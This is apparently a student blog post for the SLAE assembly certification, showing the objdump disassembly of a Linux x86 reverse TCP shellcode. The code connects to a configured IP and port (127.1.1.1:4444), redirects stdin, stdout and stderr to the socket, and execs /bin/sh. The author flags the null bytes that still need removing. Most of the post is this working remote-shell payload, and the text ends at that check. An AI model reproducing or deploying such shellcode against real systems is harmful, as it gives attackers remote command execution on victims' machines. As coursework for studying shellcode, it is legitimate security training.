
# SLAE Assignment #2

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Assignment

Create a Shell_Reverse_TCP shellcode

* Reverse connects to configured IP and Port
* Execs shell on successful connection
* IP and Port should be easily configurable


vagrant@precise32:/slae_code/Assignment 2$ objdump -d ReverseShellTcp -M intel

ReverseShellTcp:     file format elf32-i386

## Check for null bytes

The shellcode has some issues since many null bytes are present, the code must be reworked in order to be null bytes free

Disassembly of section .text:

08048080 <_start>:
 8048080:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 8048085:	bb 01 00 00 00       	mov    ebx,0x1 <-------------- Null Bytes
 804808a:	6a 00                	push   0x0 <-------------- Null Bytes
 804808c:	6a 01                	push   0x1
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b8 66 00 00 00       	mov    eax,0x66 <-------------- Null Bytes
 804809b:	bb 03 00 00 00       	mov    ebx,0x3 <-------------- Null Bytes
 80480a0:	68 7f 01 01 01       	push   0x101017f
 80480a5:	66 68 11 5c          	pushw  0x5c11
 80480a9:	66 6a 02             	pushw  0x2
 80480ac:	89 e1                	mov    ecx,esp
 80480ae:	6a 10                	push   0x10
 80480b0:	51                   	push   ecx
 80480b1:	57                   	push   edi
 80480b2:	89 e1                	mov    ecx,esp
 80480b4:	cd 80                	int    0x80
 80480b6:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 80480bb:	89 fb                	mov    ebx,edi
 80480bd:	b9 00 00 00 00       	mov    ecx,0x0 <-------------- Null Bytes
 80480c2:	cd 80                	int    0x80
 80480c4:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 80480c9:	b9 01 00 00 00       	mov    ecx,0x1 <-------------- Null Bytes
 80480ce:	cd 80                	int    0x80
 80480d0:	b8 3f 00 00 00       	mov    eax,0x3f <-------------- Null Bytes
 80480d5:	b9 02 00 00 00       	mov    ecx,0x2 <-------------- Null Bytes
 80480da:	cd 80                	int    0x80
 80480dc:	b8 0b 00 00 00       	mov    eax,0xb <-------------- Null Bytes
 80480e1:	6a 00                	push   0x0 <-------------- Null Bytes
 80480e3:	68 2f 2f 73 68       	push   0x68732f2f
 80480e8:	68 2f 62 69 6e       	push   0x6e69622f
 80480ed:	89 e3                	mov    ebx,esp
 80480ef:	b9 00 00 00 00       	mov    ecx,0x0 <-------------- Null Bytes
 80480f4:	ba 00 00 00 00       	mov    edx,0x0 <-------------- Null Bytes
 80480f9:	cd 80                	int    0x80
vagrant@precise32:/slae_code/Assignment 2$ 